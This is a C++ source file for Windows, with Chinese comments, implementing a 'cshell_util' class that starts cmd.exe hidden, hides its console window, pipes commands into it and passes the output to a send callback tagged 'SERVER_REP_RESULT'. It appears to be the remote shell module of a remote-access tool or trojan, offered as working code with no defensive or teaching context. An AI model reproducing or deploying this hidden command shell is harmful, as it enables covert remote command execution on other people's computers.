#include "cshell_util_win.h"
#include "trans_protocol.h"
#pragma warning(disable:4996)

cshell_util::cshell_util()
{
	if (IsWindows8OrGreater())
	{
		//win8以上系统
		m_win8_or_greater = 1;
	}
	else
	{
		AllocConsole();
		m_h_console = GetConsoleWindow();
		if (m_h_console != nullptr)
		{
			RECT rect;
			GetWindowRect(m_h_console, &rect);
			MoveWindow(m_h_console, 0, 0, 0, 0, TRUE);
			ShowWindow(m_h_console, SW_HIDE);

			m_std_input = GetStdHandle(STD_INPUT_HANDLE);
		}
	}
}

cshell_util::~cshell_util()
{
	if (m_running == 1)
	{
		TerminateProcess(m_cmd, 0);
		CloseHandle(m_cmd);

		Sleep(20);

		TerminateThread(m_thd, 0);
		CloseHandle(m_thd);

		CloseHandle(m_write_pipe);
		CloseHandle(m_read_pipe);
	}

	if (m_win8_or_greater == 0)
	{
		SendMessageA(m_h_console, WM_CLOSE, NULL, NULL);
		CloseHandle(m_h_console);
		FreeConsole();
	}
}

int cshell_util::create_shell()
{
	if (m_win8_or_greater == 1)
	{
		return create_shell_for_win8_or_greater();
	}
	else
	{
		return create_shell_for_win7();
	}
}

DWORD __stdcall cshell_util::read_cmd_result_cb(LPVOID lparam)
{
	cshell_util* p_this = (cshell_util*)lparam;

	DWORD read_size = 0;
	DWORD total_size = 0;

	char buff[4096] = { 0 };

	HANDLE h_read = p_this->m_read_pipe;
	HANDLE h_cmd = p_this->m_cmd;

	std::function<int(int acp, char* data, int size)> read_result_cb = p_this->m_read_result_cb;

	while (1)
	{
		DWORD ret = WaitForSingleObject(h_cmd, 50);
		if (ret != WAIT_TIMEOUT)
		{
			break;
		}

		read_size = 0;
		total_size = 0;

		while (PeekNamedPipe(h_read,buff, sizeof(buff), &read_size, &total_size , NULL))
		{
			if (read_size <= 0)
			{
				break;
			}

			memset(buff, 0, sizeof(buff));
			read_size = 0;

			//获取cmd代码页标志
			int acp = GetACP();
			if (!ReadFile(h_read, buff, sizeof(buff), &read_size, NULL))
			{
				return 0;
			}
			else
			{
				/*if (read_result_cb != nullptr)
				{
					read_result_cb(acp, buff, read_size);
				}*/
				if (p_this->m_send_cb)
				{
					p_this->m_send_cb(SERVER_REP_RESULT, buff, read_size);
				}
			}
		}
	}
	return 0;
}

int cshell_util::create_shell_for_win7()
{
	//创建管道
	SECURITY_ATTRIBUTES  sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&m_read_pipe, &m_write_pipe, &sa, 0))
	{
		return -1;
	}

	//复制句柄
	DuplicateHandle(GetCurrentProcess(), m_write_pipe, GetCurrentProcess(), &m_std_out, 0, TRUE, DUPLICATE_SAME_ACCESS);
	DuplicateHandle(GetCurrentProcess(), m_std_out, GetCurrentProcess(), &m_std_error, 0, TRUE, DUPLICATE_SAME_ACCESS);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION  pi = { 0 };

	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = m_std_input;
	si.hStdOutput = m_std_out;
	si.hStdError = m_std_error;

	TCHAR cmd_path[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%ComSpec%", cmd_path, sizeof(cmd_path));

	if (CreateProcess(NULL, cmd_path, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
	{
		m_running = 1;
		m_cmd = pi.hProcess;
		CloseHandle(pi.hThread);

		m_thd = CreateThread(NULL, 0, read_cmd_result_cb, (LPVOID)this, 0, NULL);
		return 0;
	}
	else
	{
		CloseHandle(m_read_pipe);
		CloseHandle(m_write_pipe);
		return -1;
	}
}

int cshell_util::create_shell_for_win8_or_greater()
{
	//创建管道
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	HANDLE out_read = nullptr, out_write= nullptr;

	//为标准输出重定向创建管道
	if (!CreatePipe(&out_read, &out_write, &sa, 0))
	{
		return -1;
	}

	if (!SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0))
	{
		CloseHandle(out_read);
		CloseHandle(out_write);
		return -1;
	}

	HANDLE input_read = nullptr, input_write = nullptr;

	//为标准输入重定向创建管道
	if (!CreatePipe(&input_read, &input_write, &sa, 0))
	{
		CloseHandle(out_read);
		CloseHandle(out_write);
		return -1;
	}

	if (!SetHandleInformation(input_write, HANDLE_FLAG_INHERIT, 0))
	{
		CloseHandle(input_read);
		CloseHandle(input_write);
		CloseHandle(out_read);
		CloseHandle(out_write);
		return -1;
	}
		
	//创建进程
	//使子进程使用hPipeOutputWrite作为标准输出使用hPipeInputRead作为标准输入，并使子进程在后台运行
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = input_read;
	si.hStdOutput = out_write;
	si.hStdError = out_write;

	TCHAR  cmd_path[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%ComSpec%", cmd_path, sizeof(cmd_path));

	BOOL ret = CreateProcess(NULL, cmd_path, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
	if (ret == TRUE)
	{
		m_read_pipe = out_read;
		m_write_pipe = input_write;
		m_running = 1;
		m_cmd = pi.hProcess;
		CloseHandle(pi.hThread);

		m_thd = CreateThread(NULL, 0, read_cmd_result_cb, (LPVOID)this, 0, NULL);

		//创建子进程后句柄已被继承，为了安全应该关闭它们
		CloseHandle(input_read);
		CloseHandle(out_write);
		return 0;
	}
	else
	{
		//关闭句柄
		CloseHandle(input_read);
		CloseHandle(input_write);
		CloseHandle(out_read);
		CloseHandle(out_write);
		return -1;
	}
}

int cshell_util::write_shell_cmd(char* data, int size)
{
	if (m_win8_or_greater == 1)
	{
		DWORD dw_write = 0;
		WriteFile(m_write_pipe, data, size, &dw_write, 0);
	}
	else
	{
		INPUT_RECORD ir = { 0 };
		ir.EventType = KEY_EVENT;
		ir.Event.KeyEvent.wRepeatCount = 1;
		ir.Event.KeyEvent.bKeyDown = 1;

		for (int i = 0; i < size; i++)
		{
			ir.Event.KeyEvent.uChar.AsciiChar = data[i];
			DWORD dwWrited = 0;
			WriteConsoleInputA(m_std_input, &ir, 1, &dwWrited);
			Sleep(10);
		}
	}
	return 0;
}
